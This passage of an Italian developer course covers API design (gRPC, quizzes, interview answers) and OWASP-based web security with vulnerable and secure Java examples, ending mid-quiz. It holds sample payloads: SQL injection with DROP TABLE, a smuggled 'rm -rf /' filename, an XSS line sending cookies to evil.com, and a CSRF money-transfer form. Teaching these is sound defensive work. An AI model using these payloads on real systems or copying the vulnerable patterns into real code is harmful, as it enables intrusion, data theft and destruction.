}</code></pre>

                <div class="info-box">
                    <h4>gRPC: Pro e Contro</h4>
                    <p><strong>Pro</strong>: Performance eccellente (binario, compatto), streaming bidirezionale, code generation automatica, contract-first, ideale per microservizi interni.</p>
                    <p><strong>Contro</strong>: Non leggibile da umani (binario), browser support limitato (richiede gRPC-Web), debugging più difficile, meno tooling rispetto a REST.</p>
                    <p><strong>Usa quando</strong>: Comunicazione microservizi interna, alta performance richiesta, streaming real-time, polyglot systems (genera client per qualsiasi linguaggio).</p>
                </div>

                <h3>Decision Matrix</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    QUANDO USARE COSA                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  USA REST QUANDO:                                                           │
│  • API pubblica (developer-friendly, standard)                              │
│  • Caching HTTP importante                                                  │
│  • CRUD semplice                                                            │
│  • Team ha già esperienza REST                                              │
│                                                                              │
│  USA GRAPHQL QUANDO:                                                        │
│  • Frontend complesso con dati nested                                       │
│  • Mobile app (bandwidth limitata, no over-fetching)                        │
│  • Client diversi con bisogni diversi                                       │
│  • Rapid iteration su API                                                   │
│                                                                              │
│  USA GRPC QUANDO:                                                           │
│  • Microservizi interni (non browser)                                       │
│  • Performance critica                                                      │
│  • Streaming real-time                                                      │
│  • Team polyglot (Java, Go, Python, etc.)                                   │
│                                                                              │
│  COMBINA (comune in architetture reali):                                    │
│  • REST/GraphQL per client esterni (browser, mobile)                        │
│  • gRPC per comunicazione interna tra servizi                               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Quiz Section Modulo 9 -->
            <section class="quiz-section" id="modulo9-quiz">
                <h2>Interactive Challenge Quiz - Modulo 9</h2>
                <p>Verifica la tua comprensione dell'API Design.</p>

                <!-- Question 41 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> Un client fa POST /orders due volte a causa di un network timeout. Entrambe le richieste arrivano al server. Cosa succede senza idempotency key?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q41" id="q41a" value="a">
                            <label for="q41a">Il server rileva automaticamente il duplicato e lo ignora</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q41" id="q41b" value="b">
                            <label for="q41b">Vengono creati due ordini identici (duplicato)</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q41" id="q41c" value="c">
                            <label for="q41c">La seconda richiesta riceve 409 Conflict</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q41" id="q41d" value="d">
                            <label for="q41d">HTTP garantisce at-most-once delivery</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q41')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q41"></div>
                </div>

                <!-- Question 42 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Stai progettando un'API per un feed social (timeline infinita). Quale pagination strategy è più appropriata?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q42" id="q42a" value="a">
                            <label for="q42a">Offset-based: GET /posts?page=5&size=20</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q42" id="q42b" value="b">
                            <label for="q42b">Nessuna pagination: carica tutto e filtra client-side</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q42" id="q42c" value="c">
                            <label for="q42c">Cursor-based: GET /posts?after=cursor123&limit=20</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q42" id="q42d" value="d">
                            <label for="q42d">Random sampling: ritorna 20 post casuali</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q42')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q42"></div>
                </div>

                <!-- Question 43 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Un utente autenticato cerca di accedere a una risorsa di un altro utente. Quale status code è corretto?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q43" id="q43a" value="a">
                            <label for="q43a">403 Forbidden</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q43" id="q43b" value="b">
                            <label for="q43b">401 Unauthorized</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q43" id="q43c" value="c">
                            <label for="q43c">404 Not Found</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q43" id="q43d" value="d">
                            <label for="q43d">400 Bad Request</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q43')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q43"></div>
                </div>

                <!-- Question 44 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> Perché il caching HTTP standard non funziona bene con GraphQL?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q44" id="q44a" value="a">
                            <label for="q44a">GraphQL usa un formato binario incompatibile</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q44" id="q44b" value="b">
                            <label for="q44b">Le response GraphQL sono sempre dinamiche</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q44" id="q44c" value="c">
                            <label for="q44c">GraphQL non supporta HTTP headers</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q44" id="q44d" value="d">
                            <label for="q44d">GraphQL usa sempre POST su un singolo endpoint, perdendo URL-based cache keys</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q44')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q44"></div>
                </div>

                <!-- Question 45 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Devi scegliere tra REST e gRPC per la comunicazione tra due microservizi interni ad alta frequenza (10K req/sec). Quale scegli e perché?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q45" id="q45a" value="a">
                            <label for="q45a">REST: più standard e facile da debuggare con curl</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q45" id="q45b" value="b">
                            <label for="q45b">gRPC: protobuf binario più efficiente, HTTP/2 multiplexing, code generation</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q45" id="q45c" value="c">
                            <label for="q45c">GraphQL: flessibilità nelle query tra servizi</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q45" id="q45d" value="d">
                            <label for="q45d">WebSocket: connessione persistente più efficiente</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q45')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q45"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 9 -->
            <section class="section" id="modulo9-questions">
                <h2>Domande da Colloquio - Modulo 9</h2>

                <div class="info-box">
                    <h4>Q: Come gestisci il versioning delle API? Quale strategia preferisci?</h4>
                    <p><strong>Risposta attesa:</strong> Preferisco URL path versioning (/api/v1/, /api/v2/) perché è esplicito, facile da documentare, e non richiede header speciali. Uso solo major version - minor changes sono backwards compatible. Quando introduco v2, mantengo v1 in deprecation per 6-12 mesi con header X-Deprecated e documentazione della timeline. Per evitare breaking changes, aggiungo campi (non rimuovo), uso nullable per nuovi campi required, e faccio expand/contract per rinominare.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra PUT e PATCH. Quando usi quale?</h4>
                    <p><strong>Risposta attesa:</strong> PUT è un replace completo: il client invia la rappresentazione INTERA della risorsa, e il server la sostituisce. Se ometti un campo, viene rimosso/nullato. È idempotente. PATCH è un update parziale: invii solo i campi da modificare. I campi omessi restano invariati. Non è necessariamente idempotente (dipende dalla semantica). Uso PUT quando il client ha la visione completa della risorsa. Uso PATCH per update chirurgici (es. cambiare solo lo status di un ordine) o quando la risorsa è grande e modifico poco.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come implementeresti rate limiting per un'API?</h4>
                    <p><strong>Risposta attesa:</strong> Sceglierei Token Bucket o Sliding Window per smoothness. Implementazione: 1) Redis per storage distribuito (INCR con TTL per fixed window, sorted sets per sliding window). 2) Identificazione client: API key, user ID, o IP (fallback). 3) Headers di risposta: X-RateLimit-Limit, Remaining, Reset. 4) 429 Too Many Requests con Retry-After quando superato. 5) Limiti differenziati: endpoint sensibili (login) più restrittivi, piani diversi per tier di pricing. In Kubernetes, posso anche usare rate limiting a livello di Ingress (nginx).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quali sono i problemi principali di GraphQL e come li risolvi?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Query N+1: il resolver per "orders" fa N query per gli "items". Soluzione: DataLoader per batching e caching. 2) Query complexity attack: client può richiedere query profondamente nested che sovraccaricano il server. Soluzione: query depth limiting, complexity scoring, timeout. 3) Caching: POST su endpoint unico rompe HTTP cache. Soluzione: persisted queries (hash → query), caching a livello di resolver o CDN con @cacheControl directive. 4) Security: introspection espone lo schema. In produzione, disabilitalo o limitalo.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come documenti un'API REST?</h4>
                    <p><strong>Risposta attesa:</strong> Uso OpenAPI (Swagger) 3.0 come standard. Due approcci: 1) Code-first: annotazioni nel codice (SpringDoc/Springfox) generano lo spec automaticamente. Pro: sempre sincronizzato. Contro: spec derivato dal codice, meno controllo. 2) Spec-first: scrivo lo YAML OpenAPI prima, poi genero code/stub. Pro: design-first, contratto chiaro. Contro: rischio drift. Complemento con: esempi di richieste reali, error codes documentati, Postman collection per testing interattivo, changelog per versioni.</p>
                </div>
            </section>

            <!-- ==================== MODULO 10: SECURITY ==================== -->

            <header class="module-header" id="modulo10">
                <span class="module-tag">Modulo 10</span>
                <h1>Security</h1>
                <p>OWASP Top 10, Authentication, Authorization e secure coding practices</p>
            </header>

            <!-- OWASP Top 10 Section -->
            <section class="section" id="modulo10-owasp">
                <h2>OWASP Top 10: Le Vulnerabilità Più Critiche</h2>

                <p>L'<strong>OWASP Top 10</strong> è la lista delle vulnerabilità di sicurezza più critiche per le applicazioni web. Conoscerle è fondamentale per ogni developer.</p>

                <h3>1. Injection (SQL, NoSQL, Command)</h3>

                <p>L'<strong>injection</strong> avviene quando dati non fidati vengono inviati a un interprete come parte di un comando o query. L'attaccante può eseguire comandi non autorizzati o accedere a dati.</p>

                <pre><code class="language-java">// ❌ VULNERABILE: SQL Injection
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    // Se username = "admin'; DROP TABLE users; --"
    // Query diventa: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
    return jdbcTemplate.queryForObject(query, userMapper);
}

// ✅ SICURO: Prepared Statement con parametri
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.queryForObject(query, userMapper, username);
}

// ✅ SICURO: JPA/Hibernate con parametri named
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// ❌ VULNERABILE: Command Injection
public void processFile(String filename) {
    Runtime.getRuntime().exec("convert " + filename + " output.pdf");
    // Se filename = "file.txt; rm -rf /"
}

// ✅ SICURO: Usa ProcessBuilder con array di argomenti
public void processFile(String filename) {
    ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.pdf");
    pb.start();  // Gli argomenti sono separati, non interpretati dalla shell
}</code></pre>

                <h3>2. Broken Authentication</h3>

                <p>Autenticazione debole o mal implementata permette agli attaccanti di compromettere password, chiavi o token di sessione.</p>

                <div class="info-box warning">
                    <h4>Errori Comuni</h4>
                    <ul>
                        <li>Password in chiaro o con hashing debole (MD5, SHA1)</li>
                        <li>Session ID prevedibile o esposto nell'URL</li>
                        <li>Nessun rate limiting su login (permette brute force)</li>
                        <li>Token che non scadono mai</li>
                        <li>Password reset insicuro (token prevedibile, no expiry)</li>
                    </ul>
                </div>

                <pre><code class="language-java">// ❌ SBAGLIATO: Hashing debole
String hashedPassword = DigestUtils.md5Hex(password);  // MD5 è crackabile in secondi

// ✅ CORRETTO: BCrypt con salt automatico
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);  // Work factor 12 (2^12 iterazioni)
}

// Uso
String hashedPassword = passwordEncoder.encode(rawPassword);
boolean matches = passwordEncoder.matches(rawPassword, hashedPassword);</code></pre>

                <h3>3. Cross-Site Scripting (XSS)</h3>

                <p><strong>XSS</strong> avviene quando un'applicazione include dati non fidati in una pagina web senza validazione. L'attaccante può eseguire script nel browser della vittima.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        TIPI DI XSS                                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  STORED XSS (Persistente)                                                   │
│  ─────────────────────────                                                   │
│  1. Attacker salva script malevolo nel database (es. commento)              │
│  2. Server serve la pagina con lo script                                    │
│  3. Browser della vittima esegue lo script                                  │
│  Esempio: Commento con &lt;script&gt;document.location='evil.com?c='+cookie&lt;/script&gt;│
│                                                                              │
│  REFLECTED XSS                                                              │
│  ──────────────                                                              │
│  1. Attacker invia URL malevolo alla vittima                                │
│  2. Il parametro URL viene riflesso nella risposta senza escape             │
│  3. Browser esegue lo script                                                │
│  Esempio: /search?q=&lt;script&gt;alert('xss')&lt;/script&gt;                           │
│                                                                              │
│  DOM-BASED XSS                                                              │
│  ──────────────                                                              │
│  Lo script malevolo manipola il DOM client-side                             │
│  Il payload non passa mai dal server                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// ❌ VULNERABILE: Output non escaped
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);  // Se q contiene &lt;script&gt;, verrà eseguito
    return "search";
}

// Template Thymeleaf vulnerabile
&lt;p&gt;Risultati per: &lt;span th:utext="${query}"&gt;&lt;/span&gt;&lt;/p&gt;  // utext = unescaped!

// ✅ SICURO: Escape automatico
&lt;p&gt;Risultati per: &lt;span th:text="${query}"&gt;&lt;/span&gt;&lt;/p&gt;  // text = escaped
// &lt;script&gt; diventa &amp;lt;script&amp;gt;

// ✅ SICURO: Content Security Policy header
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self'")
            )
        );
        return http.build();
    }
}</code></pre>

                <h3>4. Cross-Site Request Forgery (CSRF)</h3>

                <p><strong>CSRF</strong> forza un utente autenticato a eseguire azioni indesiderate. L'attaccante sfrutta il fatto che il browser invia automaticamente i cookie di sessione.</p>

                <pre><code class="language-html">&lt;!-- Pagina malevola dell'attacker --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amount=10000" /&gt;
&lt;!-- Il browser invia i cookie di bank.com → trasferimento eseguito! --&gt;

&lt;!-- Form nascosto che si auto-submittà --&gt;
&lt;form action="https://bank.com/transfer" method="POST" id="evil"&gt;
    &lt;input name="to" value="attacker"&gt;
    &lt;input name="amount" value="10000"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('evil').submit();&lt;/script&gt;</code></pre>

                <pre><code class="language-java">// ✅ PROTEZIONE: CSRF Token (Spring Security lo abilita di default)
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        return http.build();
    }
}

// Il form deve includere il token
&lt;form method="POST"&gt;
    &lt;input type="hidden" name="_csrf" th:value="${_csrf.token}"/&gt;
    ...
&lt;/form&gt;

// Per API stateless (JWT), CSRF non è necessario se:
// - Non usi cookie per l'auth
// - Usi Authorization header con Bearer token</code></pre>

                <h3>5. Security Misconfiguration</h3>

                <div class="info-box warning">
                    <h4>Errori di Configurazione Comuni</h4>
                    <ul>
                        <li>Stack trace esposti in produzione</li>
                        <li>Directory listing abilitato</li>
                        <li>Credenziali di default non cambiate</li>
                        <li>Headers di sicurezza mancanti</li>
                        <li>CORS troppo permissivo (<code>Access-Control-Allow-Origin: *</code>)</li>
                        <li>Debug/admin endpoint esposti in produzione</li>
                    </ul>
                </div>

                <pre><code class="language-yaml"># application-prod.yml - Configurazione sicura
server:
  error:
    include-stacktrace: never      # Mai esporre stack trace
    include-message: never

spring:
  devtools:
    restart:
      enabled: false               # Disabilita in prod
  h2:
    console:
      enabled: false               # Disabilita console H2

management:
  endpoints:
    web:
      exposure:
        include: health, info      # Solo endpoint necessari
  endpoint:
    health:
      show-details: never          # Non esporre dettagli interni</code></pre>

                <pre><code class="language-java">// Security Headers
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        // Previene clickjacking
        .frameOptions(frame -> frame.deny())
        // Previene MIME sniffing
        .contentTypeOptions(Customizer.withDefaults())
        // Forza HTTPS
        .httpStrictTransportSecurity(hsts -> hsts
            .maxAgeInSeconds(31536000)
            .includeSubDomains(true)
        )
        // Referrer policy
        .referrerPolicy(referrer -> referrer
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
        )
    );
    return http.build();
}</code></pre>
            </section>

            <!-- Authentication Section -->
            <section class="section" id="modulo10-auth">
                <h2>Authentication: Session vs Token</h2>

                <h3>Session-Based Authentication</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SESSION-BASED AUTHENTICATION                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Client                            Server                    Session Store  │
│    │                                  │                           │         │
│    │ 1. POST /login                   │                           │         │
│    │    {user, password}              │                           │         │
│    │─────────────────────────────────▶│                           │         │
│    │                                  │                           │         │
│    │                                  │ 2. Verifica credenziali   │         │
│    │                                  │ 3. Crea session           │         │
│    │                                  │──────────────────────────▶│         │
│    │                                  │    sessionId: abc123      │         │
│    │                                  │    userId: 42             │         │
│    │                                  │    roles: [ADMIN]         │         │
│    │                                  │◀──────────────────────────│         │
│    │ 4. Set-Cookie: JSESSIONID=abc123│                           │         │
│    │◀─────────────────────────────────│                           │         │
│    │                                  │                           │         │
│    │ 5. GET /api/data                 │                           │         │
│    │    Cookie: JSESSIONID=abc123     │                           │         │
│    │─────────────────────────────────▶│                           │         │
│    │                                  │ 6. Lookup session         │         │
│    │                                  │──────────────────────────▶│         │
│    │                                  │◀──────────────────────────│         │
│    │ 7. 200 OK {data}                 │                           │         │
│    │◀─────────────────────────────────│                           │         │
│                                                                              │
│  Pro: ✓ Revoca istantanea, ✓ Sicurezza (HttpOnly cookie)                   │
│  Contro: ✗ Richiede session store condiviso, ✗ Non adatto a microservizi   │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Token-Based Authentication (JWT)</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    JWT AUTHENTICATION                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Client                            Server                                    │
│    │                                  │                                      │
│    │ 1. POST /login                   │                                      │
│    │    {user, password}              │                                      │
│    │─────────────────────────────────▶│                                      │
│    │                                  │                                      │
│    │                                  │ 2. Verifica credenziali              │
│    │                                  │ 3. Genera JWT (signed)               │
│    │                                  │                                      │
│    │ 4. {accessToken, refreshToken}   │                                      │
│    │◀─────────────────────────────────│                                      │
│    │                                  │                                      │
│    │ 5. GET /api/data                 │                                      │
│    │    Authorization: Bearer &lt;JWT&gt;   │                                      │
│    │─────────────────────────────────▶│                                      │
│    │                                  │ 6. Verifica firma JWT                │
│    │                                  │    (NO database lookup!)             │
│    │ 7. 200 OK {data}                 │                                      │
│    │◀─────────────────────────────────│                                      │
│                                                                              │
│  Pro: ✓ Stateless, ✓ Scalabile, ✓ Cross-domain                             │
│  Contro: ✗ No revoca istantanea, ✗ Token size, ✗ XSS se in localStorage    │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>JWT Deep Dive</h3>

                <pre><code class="language-java">// Struttura JWT: header.payload.signature
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
// eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.
// SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// Header (Base64)
{
  "alg": "HS256",    // Algoritmo di firma
  "typ": "JWT"
}

// Payload (Base64) - Claims
{
  "sub": "user123",           // Subject (user ID)
  "name": "John Doe",         // Custom claim
  "email": "john@example.com",
  "roles": ["USER", "ADMIN"], // Custom claim
  "iat": 1706439600,          // Issued At
  "exp": 1706443200,          // Expiration (1 ora)
  "iss": "auth.example.com"   // Issuer
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)</code></pre>

                <pre><code class="language-java">// Implementazione Spring Boot con jjwt
@Service
public class JwtService {
    @Value("${jwt.secret}")
    private String secret;

    @Value("${jwt.expiration}")
    private long expiration;

    public String generateToken(UserDetails user) {
        Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;();
        claims.put("roles", user.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .toList());

        return Jwts.builder()
            .setClaims(claims)
            .setSubject(user.getUsername())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
    }

    public boolean validateToken(String token) {
        try {
            Jwts.parserBuilder()
                .setSigningKey(getSigningKey())
                .build()
                .parseClaimsJws(token);
            return true;
        } catch (JwtException e) {
            return false;  // Expired, invalid signature, malformed
        }
    }

    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }

    private SecretKey getSigningKey() {
        return Keys.hmacShaKeyFor(secret.getBytes());
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>JWT Security Best Practices</h4>
                    <ul>
                        <li><strong>Short expiration</strong>: Access token 15min, refresh token 7 days</li>
                        <li><strong>Algoritmo sicuro</strong>: HS256 minimo, RS256 per scenari multi-service</li>
                        <li><strong>Non mettere dati sensibili</strong>: Il payload è solo encoded, non encrypted</li>
                        <li><strong>Usa HttpOnly cookie</strong> per refresh token, localStorage è vulnerabile a XSS</li>
                        <li><strong>Implementa token rotation</strong>: Nuovo refresh token ad ogni uso</li>
                        <li><strong>Blacklist per logout</strong>: Traccia token revocati (se necessario)</li>
                    </ul>
                </div>

                <h3>OAuth 2.0 Flows</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    OAUTH 2.0 AUTHORIZATION CODE FLOW                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  User        Client App       Authorization Server      Resource Server     │
│   │              │                    │                       │             │
│   │ 1. Click     │                    │                       │             │
│   │   "Login"    │                    │                       │             │
│   │─────────────▶│                    │                       │             │
│   │              │                    │                       │             │
│   │ 2. Redirect to Auth Server        │                       │             │
│   │◀─────────────│                    │                       │             │
│   │   /authorize?client_id=...        │                       │             │
│   │              &redirect_uri=...    │                       │             │
│   │              &scope=read+write    │                       │             │
│   │              &state=xyz           │                       │             │
│   │                                   │                       │             │
│   │ 3. Login + Consent               │                       │             │
│   │─────────────────────────────────▶│                       │             │
│   │                                   │                       │             │
│   │ 4. Redirect back with code        │                       │             │
│   │◀──────────────────────────────────│                       │             │
│   │   /callback?code=AUTH_CODE        │                       │             │
│   │                                   │                       │             │
│   │              │ 5. Exchange code   │                       │             │
│   │              │    for tokens      │                       │             │
│   │              │───────────────────▶│                       │             │
│   │              │                    │                       │             │
│   │              │ 6. {access_token,  │                       │             │
│   │              │     refresh_token} │                       │             │
│   │              │◀───────────────────│                       │             │
│   │              │                    │                       │             │
│   │              │ 7. GET /api/data   │                       │             │
│   │              │    Authorization: Bearer token             │             │
│   │              │───────────────────────────────────────────▶│             │
│   │              │                    │                       │             │
│   │              │ 8. {data}          │                       │             │
│   │              │◀───────────────────────────────────────────│             │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Authorization Section -->
            <section class="section" id="modulo10-authorization">
                <h2>Authorization: RBAC vs ABAC</h2>

                <h3>RBAC (Role-Based Access Control)</h3>

                <p>In <strong>RBAC</strong>, i permessi sono assegnati a ruoli, e gli utenti sono assegnati a ruoli. Semplice ma può diventare rigido con requisiti complessi.</p>

                <pre><code class="language-java">// Spring Security RBAC
@Configuration
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .requestMatchers("/api/users/**").hasAnyRole("ADMIN", "USER_MANAGER")
            .requestMatchers("/api/reports/**").hasAuthority("REPORT_VIEW")
            .requestMatchers("/public/**").permitAll()
            .anyRequest().authenticated()
        );
        return http.build();
    }
}

// Method-level security
@Service
public class UserService {

    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(Long id) { ... }

    @PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
    public User getUser(Long userId) { ... }  // Admin o owner

    @PostAuthorize("returnObject.department == authentication.principal.department")
    public Document getDocument(Long id) { ... }  // Filtra dopo l'esecuzione
}</code></pre>

                <h3>ABAC (Attribute-Based Access Control)</h3>

                <p><strong>ABAC</strong> decide l'accesso basandosi su attributi di utente, risorsa, ambiente. Più flessibile ma più complesso.</p>

                <pre><code class="language-java">// ABAC con Spring Security SpEL
@PreAuthorize("""
    hasRole('DOCTOR') and
    #patient.assignedDoctorId == authentication.principal.id and
    T(java.time.LocalTime).now().isAfter(T(java.time.LocalTime).of(8, 0)) and
    T(java.time.LocalTime).now().isBefore(T(java.time.LocalTime).of(18, 0))
""")
public MedicalRecord accessPatientRecord(Patient patient) {
    // Solo il dottore assegnato, durante orario lavorativo
}

// Custom Permission Evaluator per logica complessa
@Component
public class CustomPermissionEvaluator implements PermissionEvaluator {

    @Override
    public boolean hasPermission(Authentication auth, Object target, Object permission) {
        if (target instanceof Document doc) {
            User user = (User) auth.getPrincipal();

            return switch ((String) permission) {
                case "READ" -> canRead(user, doc);
                case "WRITE" -> canWrite(user, doc);
                case "DELETE" -> canDelete(user, doc);
                default -> false;
            };
        }
        return false;
    }

    private boolean canRead(User user, Document doc) {
        // Logica complessa: owner, shared with, public, same department, etc.
        return doc.isPublic() ||
               doc.getOwnerId().equals(user.getId()) ||
               doc.getSharedWith().contains(user.getId()) ||
               (doc.getDepartment().equals(user.getDepartment()) &&
                user.hasPermission("DEPT_DOCS_READ"));
    }
}

// Uso
@PreAuthorize("hasPermission(#doc, 'READ')")
public Document getDocument(Document doc) { ... }</code></pre>

                <h3>Secrets Management</h3>

                <div class="info-box warning">
                    <h4>MAI Fare Questo</h4>
                    <ul>
                        <li>Hardcodare secrets nel codice</li>
                        <li>Committare secrets in Git (anche in repo privati)</li>
                        <li>Passare secrets come argomenti command line (visibili in ps)</li>
                        <li>Loggare secrets</li>
                    </ul>
                </div>

                <pre><code class="language-yaml"># ✅ CORRETTO: Environment variables (12-factor app)
spring:
  datasource:
    password: ${DB_PASSWORD}

# ✅ CORRETTO: Spring Cloud Config + Vault
spring:
  cloud:
    vault:
      uri: https://vault.example.com
      authentication: KUBERNETES
      kubernetes:
        role: my-app
      kv:
        backend: secret
        default-context: my-app

# ✅ CORRETTO: AWS Secrets Manager
@Value("${aws.secretsmanager.secret-name}")
private String secretName;

// Kubernetes Secrets
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  password: cGFzc3dvcmQxMjM=  # Base64 encoded

# Mount come env var nel pod
env:
  - name: DB_PASSWORD
    valueFrom:
      secretKeyRef:
        name: db-credentials
        key: password</code></pre>
            </section>

            <!-- Quiz Section Modulo 10 -->
            <section class="quiz-section" id="modulo10-quiz">
                <h2>Interactive Challenge Quiz - Modulo 10</h2>
                <p>Verifica la tua comprensione della Security.</p>

                <!-- Question 46 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Un'applicazione usa <code>SELECT * FROM users WHERE id = '" + userId + "'"</code>. L'attacker invia userId = <code>1' OR '1'='1</code>. Cosa succede?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q46" id="q46a" value="a">
                            <label for="q46a">Errore SQL: la query non è valida</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q46" id="q46b" value="b">
                            <label for="q46b">Ritorna solo l'utente con ID '1' OR '1'='1'</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q46" id="q46c" value="c">
                            <label for="q46c">Ritorna TUTTI gli utenti (bypass autenticazione)</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q46" id="q46d" value="d">
                            <label for="q46d">Il database blocca automaticamente l'injection</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q46')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q46"></div>
                </div>

                <!-- Question 47 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Un JWT è stato rubato. Come impedisci che l'attacker lo usi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q47" id="q47a" value="a">
                            <label for="q47a">Cambia la secret key del server</label>
                        </div>
                        <div class="quiz-option" data-value="b">
